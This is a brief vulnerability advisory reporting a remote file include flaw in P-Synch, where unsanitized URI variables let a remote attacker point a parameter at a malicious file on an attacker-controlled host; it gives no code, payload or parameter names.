A remote file include vulnerability has been reported for P-Synch. Due to insufficient sanitization of some user-supplied URI variables, it is possible for a remote attacker to include a malicious file in a URL.

An attacker may exploit this by supplying a path to a maliciously created file, located on an attacker-controlled host as a value for a specific URI parameter.
